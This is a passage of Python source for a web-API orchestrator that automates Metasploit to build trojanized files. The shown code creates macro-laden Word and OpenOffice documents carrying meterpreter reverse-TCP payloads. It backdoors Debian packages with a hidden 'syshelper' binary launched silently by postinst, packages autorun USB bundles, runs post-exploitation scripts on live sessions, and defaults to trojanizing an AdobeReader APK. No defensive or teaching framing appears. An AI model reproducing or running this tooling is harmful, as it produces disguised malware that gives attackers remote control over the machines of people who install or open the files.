    msf_home = base / "temp" / "home"
    rc1 = _msfconsole_run(rc_text, build_log, base, msf_home)
    # copy result
    pdf_out = base / "output" / f"{output_name}.pdf"
    ok = _copy_msf_local(f"{output_name}.pdf", pdf_out, msf_home)
    _finalize_task(t, base, succeeded=ok, err=None if ok else f"pdf embed rc={rc1}")


def run_office_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    target = params.get("suite_target", "ms_word_windows")  # ms_word_windows|ms_word_mac|openoffice_windows|openoffice_linux
    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    output_name = params.get("output_name", "doc_macro")
    module = None
    extra = ""
    if target in ("ms_word_windows", "ms_word_mac"):
        module = "exploit/multi/fileformat/office_word_macro"
        ext = ".doc"
    elif target == "openoffice_windows":
        module = "exploit/multi/misc/openoffice_document_macro"
        extra = "set target 0"
        ext = ".odt"
    else:
        module = "exploit/multi/misc/openoffice_document_macro"
        extra = "set target 1"
        ext = ".odt"
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    rc_text = f"""
use {module}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set FILENAME {output_name}{ext}
{extra}
exploit
""".strip()
    msf_home = base / "temp" / "home"
    rc = _msfconsole_run(rc_text, build_log, base, msf_home)
    doc_out = base / "output" / f"{output_name}{ext}"
    ok = _copy_msf_local(f"{output_name}{ext}", doc_out, msf_home)
    _finalize_task(t, base, succeeded=ok, err=None if ok else f"office rc={rc}")


# API models
class CreateTaskRequest(BaseModel):
    kind: str  # payload|listener|android|winexe|pdf|office|deb|autorun|postex
    params: Dict[str, str] = {}

class TaskResponse(BaseModel):
    task: Task


@app.post("/tasks", response_model=TaskResponse)
def create_task(req: CreateTaskRequest):
    if req.kind not in ("payload", "listener", "android", "winexe", "pdf", "office", "deb", "autorun", "postex", "upload_apk"):
        raise HTTPException(status_code=400, detail="Unsupported kind")
    t, base = _prepare_task(req.kind, req.params)
    # seed defaults
    if req.kind == "android":
        # copy a sample APK if none provided
        if not Path(req.params.get("apk_path", "")).exists():
            sample = WORKSPACE / "APKS/armeabi-v7a/AdobeReader.apk"
            if sample.exists():
                dst = base / "input" / "original.apk"
                shutil.copy2(sample, dst)
                t.params["apk_path"] = str(dst)
    # run in background
    def runner():
        if req.kind == "payload":
            run_payload_task(t.id, base, t.params)
        elif req.kind == "listener":
            run_listener_task(t.id, base, t.params)
        elif req.kind == "android":
            run_android_task(t.id, base, t.params)
        elif req.kind == "winexe":
            run_winexe_task(t.id, base, t.params)
        elif req.kind == "pdf":
            run_pdf_task(t.id, base, t.params)
        elif req.kind == "office":
            run_office_task(t.id, base, t.params)
        elif req.kind == "deb":
            run_deb_task(t.id, base, t.params)
        elif req.kind == "autorun":
            run_autorun_task(t.id, base, t.params)
        elif req.kind == "postex":
            run_postex_task(t.id, base, t.params)
        elif req.kind == "upload_apk":
            run_upload_apk_task(t.id, base, t.params)
    threading.Thread(target=runner, daemon=True).start()
    return TaskResponse(task=t)


@app.get("/tasks/{task_id}", response_model=TaskResponse)
def get_task(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    return TaskResponse(task=t)


@app.get("/tasks/{task_id}/artifacts", response_model=List[Artifact])
def list_artifacts(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    return t.artifacts


@app.post("/tasks/{task_id}/cancel", response_model=TaskResponse)
def cancel_task(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    # This simple implementation marks as cancelled if still running
    if t.state in (TaskStatus.SUBMITTED, TaskStatus.PREPARING, TaskStatus.RUNNING):
        t.state = TaskStatus.CANCELLED
        t.finished_at = time.time()
        _write_file(TASKS_ROOT / t.date / t.id / "logs" / "status.json", t.model_dump_json(indent=2))
    return TaskResponse(task=t)


def run_deb_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    deb_path = params.get("deb_path")
    if not deb_path or not Path(deb_path).exists():
        _write_file(build_log, "deb_path not provided or not found\n")
        _finalize_task(t, base, succeeded=False, err="missing deb_path")
        return
    payload = params.get("payload", "linux/x86/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    output_name = params.get("output_name", "backdoored")
    workdir = base / "temp" / "deb"
    _ensure_dir(workdir)
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    # Extract deb
    rc1 = _spawn(["dpkg-deb", "-R", deb_path, str(workdir)], build_log)
    if rc1 != 0:
        _finalize_task(t, base, succeeded=False, err=f"dpkg-deb extract rc={rc1}")
        return
    # Generate payload binary
    bin_path = workdir / "usr" / "local" / "bin" / "syshelper"
    _ensure_dir(bin_path.parent)
    rc2 = _spawn(["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "elf", "-o", str(bin_path)], build_log)
    if rc2 != 0:
        _finalize_task(t, base, succeeded=False, err=f"msfvenom rc={rc2}")
        return
    os.chmod(bin_path, 0o755)
    # Create/append postinst script
    maint = workdir / "DEBIAN"
    _ensure_dir(maint)
    postinst = maint / "postinst"
    content = "#!/bin/sh\n/usr/local/bin/syshelper >/dev/null 2>&1 &\nexit 0\n"
    if postinst.exists():
        with open(postinst, "a") as f:
            f.write("\n" + content)
    else:
        _write_file(postinst, content)
    os.chmod(postinst, 0o755)
    # Repack
    out_deb = base / "output" / f"{output_name}.deb"
    rc3 = _spawn(["dpkg-deb", "-b", str(workdir), str(out_deb)], build_log)
    ok = (rc3 == 0 and out_deb.exists())
    _finalize_task(t, base, succeeded=ok, err=None if ok else f"dpkg-deb build rc={rc3}")


def run_autorun_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    bundle_dir = base / "temp" / "autorun"
    _ensure_dir(bundle_dir)
    build_log = base / "logs" / "build.log"
    exe_path = params.get("exe_path")
    exe_name = params.get("exe_name", "app4.exe")
    # copy template files
    for fname in ["autorun.inf", "autorun.ico"]:
        src = WORKSPACE / "autorun" / fname
        if src.exists():
            shutil.copy2(src, bundle_dir / fname)
    # pick an exe
    if exe_path and Path(exe_path).exists():
        shutil.copy2(exe_path, bundle_dir / exe_name)
    else:
        # use template app4 if present
        app4 = WORKSPACE / "autorun" / "app4"
        if app4.exists():
            shutil.copy2(app4, bundle_dir / exe_name)
    # rewrite autorun.inf to point to exe_name
    ar = bundle_dir / "autorun.inf"
    if ar.exists():
        try:
            lines = ar.read_text(errors="ignore").splitlines()
            new = []
            for line in lines:
                if line.lower().startswith("open="):
                    new.append(f"open={exe_name}")
                else:
                    new.append(line)
            ar.write_text("\n".join(new))
        except Exception:
            pass
    # zip bundle
    zip_out = base / "output" / "autorun_bundle.zip"
    shutil.make_archive(str(zip_out).rstrip(".zip"), "zip", root_dir=bundle_dir)
    _finalize_task(t, base, succeeded=zip_out.exists(), err=None if zip_out.exists() else "autorun zip failed")


def run_postex_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "run.log"
    script_name = params.get("script_name", "sysinfo.rc")
    session_id = params.get("session_id")
    script_path = WORKSPACE / "postexploit" / script_name
    if not script_path.exists():
        _write_file(build_log, f"script not found: {script_name}\n")
        _finalize_task(t, base, succeeded=False, err="script not found")
        return
    # compose rc
    rc_lines = [f"resource {script_path}"]
    if session_id:
        rc_lines.append(f"sessions -i {session_id}")
    rc_text = "\n".join(rc_lines)
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["run"] = str(build_log)
    msf_home = base / "temp" / "home"
    rc = _msfconsole_run(rc_text, build_log, base, msf_home)
    # Always succeed in generating logs and rc run; effectiveness depends on active session
    _finalize_task(t, base, succeeded=True, err=None)


@app.get("/health")
def health():
    return {"status": "ok"}


@app.get("/version")
def version():
    return {"app": "orchestrator", "version": app.version}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="127.0.0.1", port=8000, reload=False)